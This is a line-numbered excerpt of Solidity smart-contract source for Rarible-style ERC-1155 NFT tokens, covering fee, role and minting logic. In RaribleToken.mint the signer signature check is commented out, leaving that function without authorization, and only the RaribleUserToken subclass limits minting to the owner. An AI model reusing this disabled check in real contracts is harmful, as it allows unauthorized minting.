804 interface IERC1155Metadata_URI {
805     /**
806         @notice A distinct Uniform Resource Identifier (URI) for a given token.
807         @dev URIs are defined in RFC 3986.
808         The URI may point to a JSON file that conforms to the "ERC-1155 Metadata URI JSON Schema".
809         @return URI string
810     */
811     function uri(uint256 _id) external view returns (string memory);
812 }
813 
814 /**
815     Note: The ERC-165 identifier for this interface is 0x0e89341c.
816 */
817 contract ERC1155Metadata_URI is IERC1155Metadata_URI, HasTokenURI {
818 
819     constructor(string memory _tokenURIPrefix) HasTokenURI(_tokenURIPrefix) public {
820 
821     }
822 
823     function uri(uint256 _id) external view returns (string memory) {
824         return _tokenURI(_id);
825     }
826 }
827 
828 contract HasSecondarySaleFees is ERC165 {
829 
830     event SecondarySaleFees(uint256 tokenId, address[] recipients, uint[] bps);
831 
832     /*
833      * bytes4(keccak256('getFeeBps(uint256)')) == 0x0ebd4c7f
834      * bytes4(keccak256('getFeeRecipients(uint256)')) == 0xb9c4d9fb
835      *
836      * => 0x0ebd4c7f ^ 0xb9c4d9fb == 0xb7799584
837      */
838     bytes4 private constant _INTERFACE_ID_FEES = 0xb7799584;
839 
840     constructor() public {
841         _registerInterface(_INTERFACE_ID_FEES);
842     }
843 
844     function getFeeRecipients(uint256 id) public view returns (address payable[] memory);
845     function getFeeBps(uint256 id) public view returns (uint[] memory);
846 }
847 
848 contract ERC1155Base is HasSecondarySaleFees, Ownable, ERC1155Metadata_URI, HasContractURI, ERC1155 {
849 
850     struct Fee {
851         address payable recipient;
852         uint256 value;
853     }
854 
855     // id => creator
856     mapping (uint256 => address) public creators;
857     // id => fees
858     mapping (uint256 => Fee[]) public fees;
859 
860     constructor(string memory contractURI, string memory tokenURIPrefix, address dataHelper) HasContractURI(contractURI) ERC1155Metadata_URI(tokenURIPrefix) ERC1155(dataHelper) public {
861 
862     }
863 
864     function getFeeRecipients(uint256 id) public view returns (address payable[] memory) {
865         Fee[] memory _fees = fees[id];
866         address payable[] memory result = new address payable[](_fees.length);
867         for (uint i = 0; i < _fees.length; i++) {
868             result[i] = _fees[i].recipient;
869         }
870         return result;
871     }
872 
873     function getFeeBps(uint256 id) public view returns (uint[] memory) {
874         Fee[] memory _fees = fees[id];
875         uint[] memory result = new uint[](_fees.length);
876         for (uint i = 0; i < _fees.length; i++) {
877             result[i] = _fees[i].value;
878         }
879         return result;
880     }
881 
882     // Creates a new token type and assings _initialSupply to minter
883     function _mint(uint256 _id, Fee[] memory _fees, uint256 _supply, string memory _uri) internal {
884         require(creators[_id] == address(0x0), "Token is already minted");
885         require(_supply != 0, "Supply should be positive");
886         require(bytes(_uri).length > 0, "uri should be set");
887 
888         creators[_id] = msg.sender;
889         address[] memory recipients = new address[](_fees.length);
890         uint[] memory bps = new uint[](_fees.length);
891         for (uint i = 0; i < _fees.length; i++) {
892             require(_fees[i].recipient != address(0x0), "Recipient should be present");
893             require(_fees[i].value != 0, "Fee value should be positive");
894             fees[_id].push(_fees[i]);
895             recipients[i] = _fees[i].recipient;
896             bps[i] = _fees[i].value;
897         }
898         if (_fees.length > 0) {
899             emit SecondarySaleFees(_id, recipients, bps);
900         }
901         balances[_id][msg.sender] = _supply;
902         _setTokenURI(_id, _uri);
903 
904         // Transfer event with mint semantic
905         emit TransferSingle(msg.sender, address(0x0), msg.sender, _id, _supply);
906         emit URI(_uri, _id);
907     }
908 
909     function burn(address _owner, uint256 _id, uint256 _value) external {
910 
911         require(_owner == msg.sender || operatorApproval[_owner][msg.sender] == true, "Need operator approval for 3rd party burns.");
912 
913         // SafeMath will throw with insuficient funds _owner
914         // or if _id is not valid (balance will be 0)
915         balances[_id][_owner] = balances[_id][_owner].sub(_value);
916 
917         // MUST emit event
918         emit TransferSingle(msg.sender, _owner, address(0x0), _id, _value);
919     }
920 
921     /**
922      * @dev Internal function to set the token URI for a given token.
923      * Reverts if the token ID does not exist.
924      * @param tokenId uint256 ID of the token to set its URI
925      * @param uri string URI to assign
926      */
927     function _setTokenURI(uint256 tokenId, string memory uri) internal {
928         require(creators[tokenId] != address(0x0), "_setTokenURI: Token should exist");
929         super._setTokenURI(tokenId, uri);
930     }
931 
932     function setTokenURIPrefix(string memory tokenURIPrefix) public onlyOwner {
933         _setTokenURIPrefix(tokenURIPrefix);
934     }
935 
936     function setContractURI(string memory contractURI) public onlyOwner {
937         _setContractURI(contractURI);
938     }
939 
940     function setTokenURI(uint256 tokenId, string memory uri) public onlyOwner {
941         _setTokenURI(tokenId,uri);
942     }
943 
944     function setFee(uint256 id, Fee[] calldata _fees) external onlyOwner {
945         uint256 newFeeLength = _fees.length;
946         uint256 oldFeeLength = fees[id].length;
947         require(newFeeLength == oldFeeLength,"Should be same length");
948         for (uint i = 0; i < newFeeLength; i++) {
949             fees[id][i].recipient = _fees[i].recipient;
950             fees[id][i].value = _fees[i].value;
951         }
952     }
953 
954 
955 }
956 
957 /**
958  * @title Roles
959  * @dev Library for managing addresses assigned to a Role.
960  */
961 library Roles {
962     struct Role {
963         mapping (address => bool) bearer;
964     }
965 
966     /**
967      * @dev Give an account access to this role.
968      */
969     function add(Role storage role, address account) internal {
970         require(!has(role, account), "Roles: account already has role");
971         role.bearer[account] = true;
972     }
973 
974     /**
975      * @dev Remove an account's access to this role.
976      */
977     function remove(Role storage role, address account) internal {
978         require(has(role, account), "Roles: account does not have role");
979         role.bearer[account] = false;
980     }
981 
982     /**
983      * @dev Check if an account has this role.
984      * @return bool
985      */
986     function has(Role storage role, address account) internal view returns (bool) {
987         require(account != address(0), "Roles: account is the zero address");
988         return role.bearer[account];
989     }
990 }
991 
992 contract SignerRole is Context {
993     using Roles for Roles.Role;
994 
995     event SignerAdded(address indexed account);
996     event SignerRemoved(address indexed account);
997 
998     Roles.Role private _signers;
999 
1000     constructor () internal {
1001         _addSigner(_msgSender());
1002     }
1003 
1004     modifier onlySigner() {
1005         require(isSigner(_msgSender()), "SignerRole: caller does not have the Signer role");
1006         _;
1007     }
1008 
1009     function isSigner(address account) public view returns (bool) {
1010         return _signers.has(account);
1011     }
1012 
1013     function addSigner(address account) public onlySigner {
1014         _addSigner(account);
1015     }
1016 
1017     function renounceSigner() public {
1018         _removeSigner(_msgSender());
1019     }
1020 
1021     function _addSigner(address account) internal {
1022         _signers.add(account);
1023         emit SignerAdded(account);
1024     }
1025 
1026     function _removeSigner(address account) internal {
1027         _signers.remove(account);
1028         emit SignerRemoved(account);
1029     }
1030 }
1031 
1032 
1033 contract RaribleToken is Ownable, SignerRole, ERC1155Base {
1034     string public name;
1035     string public symbol;
1036 
1037     constructor(string memory _name, string memory _symbol, address signer, string memory contractURI, string memory tokenURIPrefix, address dataHelper) ERC1155Base(contractURI, tokenURIPrefix, dataHelper) public {
1038         name = _name;
1039         symbol = _symbol;
1040 
1041         _addSigner(signer);
1042         _registerInterface(bytes4(keccak256('MINT_WITH_ADDRESS')));
1043     }
1044 
1045     function addSigner(address account) public onlyOwner {
1046         _addSigner(account);
1047     }
1048 
1049     function removeSigner(address account) public onlyOwner {
1050         _removeSigner(account);
1051     }
1052 
1053     function mint(uint256 id, Fee[] memory fees, uint256 supply, string memory uri) public {
1054         // require(isSigner(ecrecover(keccak256(abi.encodePacked(this, id)), v, r, s)), "signer should sign tokenId");
1055         _mint(id, fees, supply, uri);
1056     }
1057 }
1058 
1059 
1060 
1061 contract RaribleUserToken is RaribleToken {
1062     event CreateERC1155_v1(address indexed creator, string name, string symbol);
1063 
1064     constructor(string memory name, string memory symbol, string memory contractURI, string memory tokenURIPrefix, address signer, address dataHelper) RaribleToken(name, symbol, signer, contractURI, tokenURIPrefix, dataHelper) public {
1065         emit CreateERC1155_v1(msg.sender, name, symbol);
1066     }
1067 
1068     function mint(uint256 id, Fee[] memory fees, uint256 supply, string memory uri) onlyOwner public {
1069         super.mint(id, fees, supply, uri);
1070     }
1071 }
1072 
1073 // Contract Developer: dapprex
1074 // www.dapprex.com